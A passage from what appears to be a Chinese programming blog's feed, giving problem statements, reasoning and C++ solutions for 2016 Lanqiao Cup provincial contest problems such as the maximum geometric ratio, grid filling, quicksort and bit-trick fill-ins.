input(a,n);</div><div class="line">        input(b,m);</div><div class="line">        <span class="keyword">if</span> (n&gt;m) &#123;</div><div class="line">            swap(n,m);</div><div class="line">            swap(a,b);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">bool</span> f=<span class="literal">false</span>;</div><div class="line">        <span class="keyword">if</span> (n==<span class="number">4</span>&amp;&amp;m==<span class="number">4</span>) f=quaqua();</div><div class="line">        <span class="keyword">else</span> f=penta(n,m);</div><div class="line">        <span class="built_in">puts</span>(f?<span class="string">"YES"</span>:<span class="string">"NO"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>独立写的代码一发过，很开心。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016年蓝桥杯省赛C/C++ A组 最大比例</title>
      <url>/blog/2017/03/13/2016-lanqiao2/</url>
      <content type="html"><![CDATA[<h3 id="10-最大比例"><a href="#10-最大比例" class="headerlink" title="10. 最大比例"></a>10. 最大比例</h3><blockquote><p>X星球的某个大奖赛设了M级奖励。每个级别的奖金是一个正整数。<br>并且，相邻的两个级别间的比例是个固定值。<br>也就是说：所有级别的奖金数构成了一个等比数列。比如：<br>16,24,36,54<br>其等比值为：3/2<br>现在，我们随机调查了一些获奖者的奖金数。<br>请你据此推算可能的最大的等比值。</p><p>输入格式：<br>第一行为数字N(n&lt;100)，表示接下的一行包含N个正整数<br>第二行N个正整数Xi(Xi&lt;1 000 000 000 000)，用空格分开。每个整数表示调查到的某人的奖金数额<br>要求输出：<br>一个形如A/B的分数，要求A、B互质。表示可能的最大比例系数<br>测试数据保证了输入格式正确，并且最大比例是存在的。 </p><p>例如，输入：<br>3<br>1250 200 32<br>程序应该输出：<br>25/4<br>再例如，输入：<br>4<br>3125 32 32 200<br>程序应该输出：<br>5/2<br>再例如，输入：<br>3<br>549755813888 524288 2<br>程序应该输出：<br>4/1</p><p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗  &lt; 3000ms </p><p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。   所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。<br>注意: main函数需要返回0  注意: 只使用ANSI C/ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。 注意:<br>所有依赖的函数必须明确地在源文件中 #include <xxx>， 不能通过工程设置而省略常用头文件。<br>提交时，注意选择所期望的编译器类型。</xxx></p></blockquote><p>这题比较复杂，我们需要分析一下。<br>首先比值都是相邻级别的，所以我们可以将这n个数排序再去重，<br>（如果只剩一个数的话，那答案应该是无穷大，这里就不考虑了）<br>然后把相邻的比值都算出来，为了方便讨论，再进行排序去重。<br>得到一个序列，$f_0=q^{k_0}, f_1=q^{k_1}, \dots, f_{n-1}=q^{k_{n-1}}$，$k_i$ 严格递增。</p><p>如果我们真的知道$q$和这些整数$k$，那么答案就是$q^g$，其中$g$是所有$k$的最大公约数。<br>为什么呢？<br>因为我们要找的是一个$x$，使得 $\log_{q^x}f_i$ 均为整数，即$\frac{k_i}{x}\log_qq=\frac{k_i}{x}$均为整数，<br>显然$x$是所有$k$的约数，且$x$最大，所以所求的$x$就是$g$。</p><p>当然问题在于我们根本不知道$q$和这些$k$，但是我们很惊喜的看到了最大公约数。<br>这里我们可以借鉴辗转相减法的操作 <a href="http://baike.baidu.com/item/%E8%BE%97%E8%BD%AC%E7%9B%B8%E5%87%8F" target="_blank" rel="noopener">辗转相减法资料</a><br>不妨取两个数，定义$Q(a,b)$是由$a,b$唯一确定的最大比例，<br>且$Q$定义在无序对上，即$Q(b,a)=Q(a,b)$。<br>那么$Q(a,b)=Q(q^x,q^y)=q^{gcd(x,y)}=Q(q^x,q^{y-x})=Q(a,\frac{b}{a})\quad a&lt;b$<br>所以我们只需要重复这个“辗转相减法”就可以得到最后的答案。</p><p>具体实现的时候可以每次只操作相邻的两个比值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">110</span>;</div><div class="line"><span class="keyword">const</span> ll MAX=<span class="number">1000000000000</span>;</div><div class="line">ll a[N];</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a,ll b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!b) <span class="keyword">return</span> a;</div><div class="line">    <span class="keyword">return</span> gcd(b,a%b);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> Frac</div><div class="line">&#123;</div><div class="line">    ll up,dw;</div><div class="line">    Frac() &#123;&#125;</div><div class="line">    Frac(ll a,ll b) &#123;</div><div class="line">        <span class="keyword">if</span> (a==<span class="number">0</span>) &#123;</div><div class="line">            up=<span class="number">0</span>;dw=<span class="number">1</span>;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        ll g=gcd(a,b);</div><div class="line">        up=a/g;dw=b/g;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> Frac &amp;b) <span class="keyword">const</span> &#123;</div><div class="line">        <span class="keyword">return</span> up*b.dw&lt;dw*b.up;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> ==(<span class="keyword">const</span> Frac &amp;b) <span class="keyword">const</span> &#123;</div><div class="line">        <span class="keyword">return</span> !((*<span class="keyword">this</span>)&lt;b)&amp;&amp;!(b&lt;(*<span class="keyword">this</span>));</div><div class="line">    &#125;</div><div class="line">    Frac <span class="keyword">operator</span> /(<span class="keyword">const</span> Frac &amp;b) &#123;</div><div class="line">        <span class="keyword">return</span> Frac(up*b.dw,dw*b.up);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d/%I64d\n"</span>,up,dw);</div><div class="line">    &#125;</div><div class="line">&#125; f[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%I64d"</span>,&amp;a[i]);</div><div class="line">    &#125;</div><div class="line">    sort(a,a+n);</div><div class="line">    n=unique(a,a+n)-a<span class="number">-1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        f[i]=Frac(a[i+<span class="number">1</span>],a[i]);</div><div class="line">    &#125;</div><div class="line">    <span class="function">Frac <span class="title">ans</span><span class="params">(MAX,<span class="number">1</span>)</span></span>;</div><div class="line">    <span class="keyword">while</span> (n&gt;<span class="number">1</span>) &#123;</div><div class="line">        sort(f,f+n);</div><div class="line">        <span class="keyword">if</span> (f[<span class="number">0</span>]&lt;ans) ans=f[<span class="number">0</span>];</div><div class="line">        n=unique(f,f+n)-f<span class="number">-1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">            f[i]=f[i+<span class="number">1</span>]/f[i];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (f[<span class="number">0</span>]&lt;ans) ans=f[<span class="number">0</span>];</div><div class="line">    ans.print();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> 蓝桥杯 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016年蓝桥杯省赛C/C++ A组题解（含题目）</title>
      <url>/blog/2017/03/13/2016-lanqiao1/</url>
      <content type="html"><![CDATA[<h3 id="1-网友年龄"><a href="#1-网友年龄" class="headerlink" title="1.  网友年龄"></a>1.  网友年龄</h3><blockquote><p>某君新认识一网友。 当问及年龄时，他的网友说： “我的年龄是个2位数，我比儿子大27岁,  如果把我的年龄的两位数字交换位置，刚好就是我儿子的年龄”<br>请你计算：网友的年龄一共有多少种可能情况？<br>提示：30岁就是其中一种可能哦.   请填写表示可能情况的种数。<br>注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</p></blockquote><p>小学奥数或者枚举一下：<code>7</code></p><h3 id="2-生日蜡烛"><a href="#2-生日蜡烛" class="headerlink" title="2.  生日蜡烛"></a>2.  生日蜡烛</h3><blockquote><p>某君从某年开始每年都举办一次生日party，并且每次都要吹熄与年龄相同根数的蜡烛。 现在算起来，他一共吹熄了236根蜡烛。<br>请问，他从多少岁开始过生日party的？<br>请填写他开始过生日party的年龄数。<br>注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</p></blockquote><p>等差数列，枚举首项：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++) &#123;</div><div class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>,j=i;</div><div class="line">        <span class="keyword">while</span> (sum&lt;<span class="number">236</span>) &#123;</div><div class="line">            sum+=j++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (sum==<span class="number">236</span>) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,i,j);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>我觉得枚举首项从1到100是比较合理的。。。<del>有人说答案是236我觉得他可能没救了…</del><br>正确答案：<code>26</code></p><h3 id="3-方格填数"><a href="#3-方格填数" class="headerlink" title="3.  方格填数"></a>3.  方格填数</h3><blockquote><p>如下的10个格子<br><img src="http://img.blog.csdn.net/20160320183620161" alt="方格"><br>填入0~9的数字。要求：连续的两个数字不能相邻。 （左右、上下、对角都算相邻）<br>一共有多少种可能的填数方案？<br>请填写表示方案数目的整数。<br>注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</p></blockquote><p>dfs，不过不优化的话有$10!$种，边填边判断即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="comment">/*本来要判断八个格子，</span></div><div class="line"> *但是由于是从左往右从上往下填的，</div><div class="line"> *只要判断左、左上、上、右上</div><div class="line">*/</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> dx[]=&#123;<span class="number">0</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> dy[]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1e9</span>;</div><div class="line"><span class="keyword">bool</span> used[<span class="number">10</span>];</div><div class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> a[<span class="number">5</span>][<span class="number">5</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">alright</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</div><div class="line">        <span class="keyword">int</span> xx=x+dx[i],yy=y+dy[i];</div><div class="line">        <span class="keyword">if</span> (xx&lt;<span class="number">1</span>||yy&lt;<span class="number">1</span>||xx&gt;<span class="number">3</span>||yy&gt;<span class="number">4</span>) <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(n-a[xx][yy])==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (x==<span class="number">3</span>&amp;&amp;y==<span class="number">4</span>) &#123;</div><div class="line">        ans++;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (!used[i]&amp;&amp;alright(i,x,y)) &#123;</div><div class="line">            a[x][y]=i;</div><div class="line">            used[i]=<span class="literal">true</span>;</div><div class="line">            <span class="keyword">if</span> (y==<span class="number">4</span>) dfs(x+<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">            <span class="keyword">else</span> dfs(x,y+<span class="number">1</span>);</div><div class="line">            used[i]=<span class="literal">false</span>;</div><div class="line">            a[x][y]=-INF;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++) &#123;</div><div class="line">            a[i][j]=-INF;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    dfs(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>正确答案：<code>1580</code></p><h3 id="4-快速排序"><a href="#4-快速排序" class="headerlink" title="4.  快速排序"></a>4.  快速排序</h3><blockquote><p>排序在各种场合经常被用到。 快速排序是十分常用的高效率的算法。<br>其思想是：先选一个“标尺”， 用它把整个队列过一遍筛子，<br>以保证：其左边的元素都不大于它，其右边的元素都不小于它。<br>这样，排序问题就被分割为两个子区间。 再分别对子区间排序就可以了。<br>下面的代码是一种实现，请分析并填写划线部分缺少的代码。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> t = a[i];</div><div class="line">    a[i] = a[j];</div><div class="line">    a[j] = t;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> p, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i = p;</div><div class="line">    <span class="keyword">int</span> j = r + <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> x = a[p];</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">while</span>(i&lt;r &amp;&amp; a[++i]&lt;x);</div><div class="line">        <span class="keyword">while</span>(a[--j]&gt;x);</div><div class="line">        <span class="keyword">if</span>(i&gt;=j) <span class="keyword">break</span>;</div><div class="line">        swap(a,i,j);</div><div class="line">    &#125;</div><div class="line">    ______________________;</div><div class="line">    <span class="keyword">return</span> j;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> p, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(p&lt;r)&#123;</div><div class="line">        <span class="keyword">int</span> q = partition(a,p,r);</div><div class="line">        quicksort(a,p,q<span class="number">-1</span>);</div><div class="line">        quicksort(a,q+<span class="number">1</span>,r);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">int</span> a[] = &#123;<span class="number">5</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">19</span>,<span class="number">27</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">17</span>&#125;;</div><div class="line">    <span class="keyword">int</span> N = <span class="number">12</span>;</div><div class="line">    </div><div class="line">    quicksort(a, <span class="number">0</span>, N<span class="number">-1</span>);</div><div class="line">    </div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>注意：只填写缺少的内容，不要书写任何题面已有代码或说明性文字。</p></blockquote><p>答案：<code>swap(a,p,j)</code> <a href="http://www.cnblogs.com/cylee025/archive/2011/05/11/2043714.html" target="_blank" rel="noopener">快速排序资料</a></p><h3 id="5-消除尾一"><a href="#5-消除尾一" class="headerlink" title="5.  消除尾一"></a>5.  消除尾一</h3><blockquote><p>下面的代码把一个整数的二进制表示的最右边的连续的1全部变成0<br>如果最后一位是0，则原数字保持不变。<br>如果采用代码中的测试数据，应该输出：<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00000000000000000000000001100111 </span>  <span class="number">00000000000000000000000001100000</span></div><div class="line"><span class="symbol">00000000000000000000000000001100 </span>  <span class="number">00000000000000000000000000001100</span></div></pre></td></tr></table></figure></p><p>请仔细阅读程序，填写划线部分缺少的代码。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span> </span></div><div class="line">&#123;  </div><div class="line">    <span class="keyword">int</span> i; </div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) <span class="built_in">printf</span>(<span class="string">"%d"</span>, (x&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>);  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"   "</span>);</div><div class="line">    </div><div class="line">    x = _______________________;   </div><div class="line">    </div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) <span class="built_in">printf</span>(<span class="string">"%d"</span>, (x&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>);  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></div><div class="line">&#123; </div><div class="line">    f(<span class="number">103</span>);  </div><div class="line">    f(<span class="number">12</span>);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>注意：只填写缺少的内容，不要书写任何题面已有代码或说明性文字。</p></blockquote><p>要做这道题首先要知道位运算，<a href="http://www.cnblogs.com/911/archive/2008/05/20/1203477.html" target="_blank" rel="noopener">位运算资料</a><br>最好还要知道负数怎么参与位运算，<a href="http://blog.csdn.net/hnlyyk/article/details/47804885" target="_blank" rel="noopener">补码资料</a><br>如果想要了解我的做法还要学习lowbit，<a href="http://www.cnblogs.com/chenzhiyin/p/5292798.html" target="_blank" rel="noopener">lowbit资料</a></p><p>这题当时我想了很久，因为它必须在一行内就算出来，所以我想到了lowbit，它可以很方便的得到。<br>然而怎么让它套用上lowbit也不是一件容易的事。。。不过最后还是做出来了~</p><p>要消除x末尾所有的1，可以先把x加上1：<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00000000000000000000000001100111 </span>+ <span class="number">1</span> =</div><div class="line"><span class="number">00000000000000000000000001101000</span></div></pre></td></tr></table></figure></p><p>再减去新的数的lowbit：<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00000000000000000000000001101000 </span>- <span class="number">00000000000000000000000000001000</span> =</div><div class="line"><span class="number">00000000000000000000000001100000</span></div></pre></td></tr></table></figure></p><p>所以我的答案是：<code>x+1-((x+1)&amp;(-x-1))</code><br>当然标准答案更加简单：<code>x&amp;(x+1)</code></p><h3 id="6-寒假作业"><a href="#6-寒假作业" class="headerlink" title="6.  寒假作业"></a>6.  寒假作业</h3><blockquote><p>现在小学的数学题目也不是那么好玩的。<br>看看这个寒假作业：<br>□ + □ = □<br>□ - □ = □<br>□ × □ = □<br>□ ÷ □ = □<br>每个方块代表1~13中的某一个数字，但不能重复。<br>比如：<br>6  + 7 = 13<br>9  - 8 = 1<br>3  * 4 = 12<br>10 / 2 = 5<br>以及：<br>7  + 6 = 13<br>9  - 8 = 1<br>3  * 4 = 12<br>10 / 2 = 5<br>就算两种解法。（加法，乘法交换律后算不同的方案）<br>你一共找到了多少种方案？<br>请填写表示方案数目的整数。<br>注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。 </p></blockquote><p>dfs一个一个填，每个等式判断一下。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">bool</span> used[<span class="number">15</span>];</div><div class="line"><span class="keyword">int</span> a[<span class="number">15</span>];</div><div class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> dep)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (dep==<span class="number">13</span>) &#123;</div><div class="line">        <span class="comment">//必须整除，变成乘法判断</span></div><div class="line">        <span class="keyword">if</span> (a[<span class="number">10</span>]==a[<span class="number">11</span>]*a[<span class="number">12</span>]) ans++;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (dep==<span class="number">10</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (a[<span class="number">7</span>]*a[<span class="number">8</span>]!=a[<span class="number">9</span>]) <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (dep==<span class="number">7</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (a[<span class="number">4</span>]-a[<span class="number">5</span>]!=a[<span class="number">6</span>]) <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (dep==<span class="number">4</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (a[<span class="number">1</span>]+a[<span class="number">2</span>]!=a[<span class="number">3</span>]) <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">13</span>;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (!used[i]) &#123;</div><div class="line">            used[i]=<span class="literal">true</span>;</div><div class="line">            